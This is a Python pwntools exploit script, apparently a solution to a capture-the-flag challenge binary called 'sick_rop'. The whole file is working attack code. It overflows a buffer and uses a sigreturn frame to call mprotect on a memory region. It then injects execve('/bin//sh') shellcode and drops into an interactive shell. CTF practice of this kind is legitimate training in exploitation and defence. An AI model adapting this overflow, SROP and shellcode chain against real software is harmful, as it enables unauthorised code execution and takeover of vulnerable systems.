from pwn import *

elf = ELF("./sick_rop")
io = elf.process()
context.arch = 'amd64'

syscall = 0x0000000000401014
vuln = 0x000000000040102e

# frame = SigreturnFrame(kernel='amd64')

# frame.rax = 10 
# frame.rdi = 0x0000000000400000   # 104 
# frame.rsi = 0x2000               # 112 
# frame.rdx = 7                    # 136      # rwx 
# frame.rsp = vuln                 # 160
# frame.rip = syscall              # 168

# print(str(frame))


payload = b'a'*40 # + b'x'*8
payload += p64(vuln) + p64(syscall) 

payload += p64(0)*13 +  p64(0x0000000000400000) + p64(0x4000) + p64(0)*2 + p64(7) + p64(0)*2 +  p64(vuln) + p64(syscall) + p64(vuln) + p64(0x33)
# payload += b'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaae'
gdb.attach(io,"b* 0x000000000040104d")

io.sendline(payload)
io.recv()
pay = b'x'*14 

io.sendline(pay)
io.recv()

# sigreturn() entered 

shellcode = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"

payload = shellcode + b"\x90"*17 + p64(vuln)

io.sendline(payload)

io.recv()

io.interactive()

